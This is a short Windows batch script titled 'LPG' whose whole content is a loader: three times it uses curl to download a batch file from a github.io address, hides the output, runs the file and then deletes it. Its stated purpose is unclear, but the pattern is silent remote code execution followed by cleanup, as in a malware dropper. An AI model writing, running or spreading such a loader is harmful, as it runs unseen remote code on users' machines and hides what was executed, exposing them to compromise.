@echo off
cls
rem call any

curl -o any.bat https://suporteeq.github.io/any.bat > NUL 2>&1 && call any.bat && del any.bat > NUL 2>&1

title LPG
echo LPG
rem timeout /t 3

curl -o temp.bat https://suporteeq.github.io/temp.bat > NUL 2>&1 && call temp.bat && del temp.bat > NUL 2>&1

curl -o notify.bat https://suporteeq.github.io/notify.bat > NUL 2>&1 && call notify.bat && del notify.bat > NUL 2>&1